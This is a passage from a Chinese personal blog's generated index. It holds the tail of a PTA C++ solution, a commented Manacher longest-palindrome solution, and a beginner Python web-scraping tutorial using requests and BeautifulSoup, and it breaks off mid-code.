min_i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; n - min_i &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;No Solution&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单身狗"><a href="#单身狗" class="headerlink" title="单身狗"></a>单身狗</h5><p><a href="https://blog.csdn.net/m0_53209892/article/details/119684789">PTA 1065 单身狗 (25 分) C++实现_找出单身狗c++-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目0x2</title>
      <link href="/2024/04/12/%E7%AE%97%E6%B3%95/%E9%A2%98%E7%9B%AE0x2/"/>
      <url>/2024/04/12/%E7%AE%97%E6%B3%95/%E9%A2%98%E7%9B%AE0x2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目0x2"><a href="#题目0x2" class="headerlink" title="题目0x2"></a>题目0x2</h1><p>主要记录一些PTA解题中接触到的算法</p><h3 id="Manacher（马拉车）（求解回文串）"><a href="#Manacher（马拉车）（求解回文串）" class="headerlink" title="Manacher（马拉车）（求解回文串）"></a>Manacher（马拉车）（求解回文串）</h3><p>参考：<a href="https://oi-wiki.org/string/manacher/">Manacher - OI Wiki (oi-wiki.org)</a></p><p><a href="https://blog.csdn.net/guoqingshuang/article/details/80361154">L2-008 最长对称子串（25 分）-CSDN博客</a></p><h5 id="最长对称字串"><a href="#最长对称字串" class="headerlink" title="最长对称字串"></a>最长对称字串</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240413100057703.png" alt="image-20240413100057703"></p><p>有点难理解，自己需要自己手动模拟下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string s;</span><br><span class="line"><span class="type">int</span> p[<span class="number">2010</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="built_in">getline</span>(cin, s);</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">length</span>(), id = <span class="number">0</span>, maxlen = <span class="number">0</span>;<span class="comment">//迄今为止找到的最右边回文串的中心。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = len; i &gt;= <span class="number">0</span>; --i)<span class="comment">//将偶回文串也转换为奇回文串</span></span><br><span class="line">&#123;</span><br><span class="line">s[<span class="number">2</span> * i + <span class="number">2</span>] = s[i];</span><br><span class="line">s[<span class="number">2</span> * i + <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">s[<span class="number">0</span>] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">2</span> * len + <span class="number">1</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p[id] + id &gt; i)<span class="comment">//检查以 id 为中心的回文串是否延伸到当前位置 i 之后。</span></span><br><span class="line">p[i] = p[<span class="number">2</span> * id - i] &lt; p[id] + id - i ? p[<span class="number">2</span> * id - i] : p[id] + id - i;</span><br><span class="line">        <span class="comment">//i位于id右侧，2*id-i表示关于id对称的i，p[2 * id - i]表示回文串的半径</span></span><br><span class="line">        <span class="comment">//p[id] + id - i表示该回文串不延伸到右边界的最大可能半径。</span></span><br><span class="line">        <span class="comment">//为什么这样做呢，因为左边回文串的长度可能大于延伸到左边界的半径，而右边界外的字符串不能确定</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p[i] = <span class="number">1</span>;<span class="comment">//否则置1，朴素算法求p[i]</span></span><br><span class="line"><span class="keyword">while</span> (s[i - p[i]] == s[i + p[i]])<span class="comment">//朴素算法更新回文字符串的长度</span></span><br><span class="line">++p[i];</span><br><span class="line"><span class="keyword">if</span> (id + p[id] &lt; i + p[i])<span class="comment">//i回文串的右边界已经超出id回文串的右边界，更新id</span></span><br><span class="line">id = i;</span><br><span class="line"><span class="keyword">if</span> (maxlen &lt; p[i])<span class="comment">//更新maxlen</span></span><br><span class="line">maxlen = p[i];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; maxlen - <span class="number">1</span> &lt;&lt; endl;<span class="comment">//maxlen表示以某个字符为中心的最大长度</span></span><br><span class="line">    <span class="comment">//如aba的回文长度为3，#a#b#a#,中maxlen为“#a#b”，4-1=3</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫0x1</title>
      <link href="/2024/04/12/python/Python%E7%88%AC%E8%99%AB/"/>
      <url>/2024/04/12/python/Python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h1><p>[toc]</p><h3 id="request库"><a href="#request库" class="headerlink" title="request库"></a>request库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.icourse163.org&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)<span class="comment">#状态码200，访问成功</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(r))  <span class="comment">#&lt;class &#x27;requests.models.Response&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#编码方式</span></span><br><span class="line"><span class="built_in">print</span>(r.encoding)       <span class="comment">#charset字段获得，不存在默认为ISO-8859-1</span></span><br><span class="line"><span class="built_in">print</span>(r.apparent_encoding)  <span class="comment">#备选编码，通过分析内容推断出编码</span></span><br><span class="line"></span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span><span class="comment">#设置编码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)<span class="comment">#html内容</span></span><br><span class="line"><span class="built_in">print</span>(r.headers)<span class="comment">#http请求头</span></span><br><span class="line"><span class="built_in">print</span>(r.content)        <span class="comment">#用于解析图片等内容</span></span><br></pre></td></tr></table></figure><h4 id="request对象属性"><a href="#request对象属性" class="headerlink" title="request对象属性"></a>request对象属性</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP header中猜测的响应内容编码方式</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式</td></tr></tbody></table></div><h4 id="request对象方法"><a href="#request对象方法" class="headerlink" title="request对象方法"></a>request对象方法</h4><p>方法说明</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td>requests.head()</td><td>获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table></div><h4 id="通用代码框架"><a href="#通用代码框架" class="headerlink" title="通用代码框架"></a>通用代码框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHTMLText</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取指定 URL 的 HTML 内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        url (str): 要获取 HTML 内容的 URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: 成功获取到的 HTML 内容，如果请求失败则返回 &quot;产生异常&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">1</span>)  <span class="comment"># 发送 HTTP GET 请求，可以通过timeout=1设置超时时间为 1 秒</span></span><br><span class="line">        r.raise_for_status()  <span class="comment"># 检查是否出现 HTTP 请求错误</span></span><br><span class="line">        r.encoding = r.apparent_encoding  <span class="comment"># 根据响应内容自动设置编码</span></span><br><span class="line">        <span class="keyword">return</span> r.text  <span class="comment"># 返回 HTML 内容</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;产生异常&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> </span><br><span class="line">    url1 = <span class="string">&quot;https://www.baidu.com/&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(getHTMLText(url1))  <span class="comment"># 成功输出HTML内容</span></span><br><span class="line">    url2 = <span class="string">&quot;https://chat.openai.com/&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(getHTMLText(url2))  <span class="comment"># 产生异常</span></span><br><span class="line">    first_time =  time.time()</span><br><span class="line">    N = <span class="number">100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,N):</span><br><span class="line">        getHTMLText(url1)</span><br><span class="line">    last_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;访问<span class="subst">&#123;N&#125;</span>次耗时:<span class="subst">&#123;last_time-first_time&#125;</span>&#x27;</span>)  <span class="comment">#访问100次耗时:9.285466194152832</span></span><br><span class="line">    <span class="comment">#可以看到request库性能较低</span></span><br></pre></td></tr></table></figure><h4 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h4><p>我们可以在网站的根目录建立一个<code>robots.txt</code>文件来说明限制爬虫的行为，但是这只是一种公示，不能真正阻止爬虫。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ol><li>当网站对访问用户设备有限制时，我们可以修改<code>user-agent字段</code>实现访问。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kv = &#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url,timeout=<span class="number">1</span>,headers=kv) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.部分网站提供API URL 搜索</p><p>百度：<a href="http://www.baidu.com/s?wd">http://www.baidu.com/s?wd</a></p><p>360：<a href="http://www.so.com/s?q">http://www.so.com/s?q</a></p><p>百度的我没有爬到，这里发下360的爬虫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;http://www.so.com/s&#x27;</span></span><br><span class="line">keyword =<span class="string">&#x27;Python&#x27;</span></span><br><span class="line">kv = &#123;<span class="string">&#x27;q&#x27;</span>:keyword&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">&#x27;q&#x27;</span>:keyword&#125;</span><br><span class="line">    r= requests.get(url,params = kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding= r.apparent_encoding</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爬取失败&#x27;</span>)</span><br></pre></td></tr></table></figure><ol><li>存储</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> os        </span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;https://img-blog.csdnimg.cn/f35b24a8c05744dca042a64ef2154c12.png&#x27;</span>  </span><br><span class="line">root = <span class="string">&quot;H:/pachong/&quot;</span>  <span class="comment"># 图片保存的根目录</span></span><br><span class="line">path = root + url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]  <span class="comment"># 图片保存的完整路径，使用URL中最后一个/后的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):  <span class="comment"># 如果根目录不存在，则创建</span></span><br><span class="line">        os.makedirs(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):  <span class="comment"># 如果文件不存在，则执行以下操作</span></span><br><span class="line">        r = requests.get(url) </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 以二进制写入模式打开文件</span></span><br><span class="line">            f.write(r.content)  <span class="comment"># 二进制写入</span></span><br><span class="line">            f.close()           </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;文件已保存&quot;</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件已存在&quot;</span>)  </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爬取失败&#x27;</span>)  </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>ip归属地查询</li></ol><p>我这里用的是ip38查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;https://ip38.com/ip.php&#x27;</span></span><br><span class="line">keyword =<span class="string">&#x27;ip-address&#x27;</span></span><br><span class="line">kv = &#123;<span class="string">&#x27;ip&#x27;</span>:keyword&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">&#x27;ip&#x27;</span>:keyword&#125;</span><br><span class="line">    r= requests.get(url,params = kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding= r.apparent_encoding</span><br><span class="line">    <span class="built_in">print</span>(r.request.url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爬取失败&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h3><ul><li>默认编码为<code>UTF-8</code></li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://baike.baidu.com/item/%E5%88%9D%E9%9F%B3%E6%9C%AA%E6%9D%A5/8231955&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    demo = r.text</span><br><span class="line">    soup = BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)<span class="comment">#html解析</span></span><br><span class="line">    <span class="built_in">print</span>(soup.prettify())<span class="comment">#添加缩进和换行符，使得文档的结构更加清晰易读。</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h4><p>基本元素说明</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Tag</td><td>标签，最基本的信息组织单元，分别用<>和</>标明开头和结尾</td></tr><tr><td>Name</td><td>标签的名字，<p>…</p>的名字是’p’，格式：<tag>.name</td></tr><tr><td>Attributes</td><td>标签的属性，字典形式组织，格式：<tag>.attrs</td></tr><tr><td>NavigableString</td><td>标签内非属性字符串，<>…</>中字符串，格式：<tag>.string</td></tr><tr><td>Comment</td><td>标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://python123.io/ws/demo.html&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    demo = r.text</span><br><span class="line">    soup = BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="comment">#print(soup.prettify())</span></span><br><span class="line">    <span class="built_in">print</span>(soup.title)</span><br><span class="line"></span><br><span class="line">    tag = soup.a</span><br><span class="line">    <span class="built_in">print</span>(tag)</span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line">    <span class="built_in">print</span>(tag.parent.name)</span><br><span class="line">    <span class="built_in">print</span>(tag.parent.parent.name)</span><br><span class="line">    <span class="built_in">print</span>(tag.attrs)</span><br><span class="line">    <span class="built_in">print</span>(tag.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(tag))</span><br><span class="line"></span><br><span class="line">    tag1 = soup.p</span><br><span class="line">    <span class="built_in">print</span>(soup.p.string)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(soup.p.string))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line">    newsoup = BeautifulSoup(<span class="string">&quot;&lt;b&gt;&lt;!--This is a comment--&gt;&lt;/b&gt;&lt;p&gt;This is not a comment&lt;/p&gt;&quot;</span>,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(newsoup.b.string)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(newsoup.b.string))</span><br><span class="line">    <span class="built_in">print</span>(newsoup.p.string)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(newsoup.p.string))</span><br><span class="line"><span class="comment"># 注意通过`.string`输出不会指出该类型为`comment`，所以我们要通过`type()`来判断是否为注释</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="HTML内容遍历"><a href="#HTML内容遍历" class="headerlink" title="HTML内容遍历"></a>HTML内容遍历</h4><p>分为<code>下行遍历</code>、<code>上行遍历</code>和<code>平行遍历</code>，直接看代码更容易理解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  <span class="comment"># 导入BeautifulSoup库，用于解析HTML</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://python123.io/ws/demo.html&#x27;</span>  <span class="comment"># 目标页面URL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)  <span class="comment"># 发送GET请求获取页面内容</span></span><br><span class="line">    demo = r.text  <span class="comment"># 获取页面文本</span></span><br><span class="line">    soup = BeautifulSoup(demo, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 解析页面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印&lt;head&gt;标签的子节点</span></span><br><span class="line">    <span class="built_in">print</span>(soup.head.contents)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印&lt;body&gt;标签的子节点</span></span><br><span class="line">    <span class="built_in">print</span>(soup.body.contents)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------下行遍历---------------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用.children属性遍历&lt;body&gt;标签的子节点</span></span><br><span class="line">    <span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span class="line">        <span class="built_in">print</span>(child)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印&lt;body&gt;标签的子节点数量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(soup.body.contents))</span><br><span class="line">    <span class="comment"># 打印&lt;body&gt;标签的每个子节点</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(soup.body.contents)):</span><br><span class="line">        <span class="built_in">print</span>(soup.body.contents[i])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------上行遍历---------------------------------------------------------------&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历&lt;a&gt;标签的所有父节点</span></span><br><span class="line">    <span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">        <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(parent)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 打印父节点的名称</span></span><br><span class="line">            <span class="built_in">print</span>(parent.name)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------------------------平行遍历---------------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印&lt;p&gt;标签的文本内容</span></span><br><span class="line">    <span class="built_in">print</span>(soup.p)</span><br><span class="line">    <span class="comment"># 遍历&lt;p&gt;标签之后的所有兄弟节点</span></span><br><span class="line">    <span class="keyword">for</span> sibling <span class="keyword">in</span> soup.p.next_siblings:</span><br><span class="line">        <span class="built_in">print</span>(sibling)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;#########################################################################################################################################&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历&lt;p&gt;标签之前的所有兄弟节点</span></span><br><span class="line">    <span class="keyword">for</span> sibling <span class="keyword">in</span> soup.p.previous_siblings:</span><br><span class="line">        <span 